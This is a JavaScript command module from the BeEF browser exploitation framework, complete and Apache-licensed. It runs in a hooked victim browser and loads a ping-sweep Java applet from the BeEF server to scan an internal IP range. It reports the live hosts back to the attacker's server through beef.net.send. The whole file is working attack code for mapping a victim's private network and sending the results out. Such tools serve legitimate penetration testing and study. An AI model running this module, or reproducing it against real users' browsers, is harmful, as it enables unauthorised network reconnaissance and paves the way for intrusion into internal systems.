//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

beef.execute(function() {

    var ipRange = "<%= @ipRange %>";
    var timeout = "<%= @timeout %>";
    var appletTimeout = 30;
    var output = "";
    var hostNumber = 0;
    var internal_counter = 0;
    var firstMsgSent = false;

    beef.dom.attachApplet('pingSweep', 'pingSweep', 'pingSweep', "http://"+beef.net.host+":"+beef.net.port+"/", null, [{'ipRange':ipRange, 'timeout':timeout}]);

		function waituntilok() {
			try {
			    hostNumber = document.pingSweep.getHostsNumber();
                if(hostNumber != null && hostNumber > 0){
                    if(!firstMsgSent){
                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Applet attached.<br>Hosts to check: ' + hostNumber + '<br>Required time (s): ~' + (timeout * hostNumber)/1000);
                        firstMsgSent = true;
                    }
                    output = document.pingSweep.getAliveHosts();
                    clearTimeout(int_timeout);
                    clearTimeout(ext_timeout);
				    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"));
				    beef.dom.detachApplet('pingSweep');
				    return;
                }else{
                     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check');
                     return;
                }
			} catch (e) {
				internal_counter++;
				if (internal_counter > appletTimeout) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Timeout after '+appletTimeout+' seconds');
					beef.dom.detachApplet('pingSweep');
					return;
				}
				int_timeout = setTimeout(function() {waituntilok()},1000);
			}
		}

		ext_timeout = setTimeout(function() {waituntilok()},5000);

});

